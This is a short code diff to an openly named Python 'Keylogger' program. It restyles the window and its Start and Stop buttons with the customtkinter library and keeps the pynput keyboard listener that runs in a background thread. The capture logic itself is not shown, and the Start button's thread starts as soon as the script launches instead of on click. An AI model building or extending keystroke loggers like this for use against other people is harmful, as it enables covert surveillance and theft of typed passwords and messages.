@@ -1,11 +1,13 @@
 from tkinter import * 
 from pynput.keyboard import Key, Listener 
+import customtkinter
 import threading
 
-root = Tk()
+root = customtkinter.CTk()
 root.title('Keylogger')
-root.geometry("300x300")
-root.configure(bg="#34495E")
+root.geometry("400x300")
+customtkinter.set_appearance_mode('dark')
+customtkinter.set_default_color_theme('green')
 
 def start_Keylogger():
     letter = []
@@ -38,11 +40,11 @@ def start_Keylogger():
 def close():
    root.destroy()
 
-button_start = Button(root, text = 'Start',padx = 80, pady = 30, command = threading.Thread(target=start_Keylogger).start())
-button_start.pack(pady=30)
+button_start = customtkinter.CTkButton(master=root, text = 'Start',command = threading.Thread(target=start_Keylogger).start())
+button_start.pack(pady=60)
 
 
-buttton_stop = Button(root, text = 'Stop',padx = 80, pady = 30,command = close)
+buttton_stop = customtkinter.CTkButton(master=root, text = 'Stop',command = close)
 buttton_stop.pack(pady=10)
 
 root.mainloop()
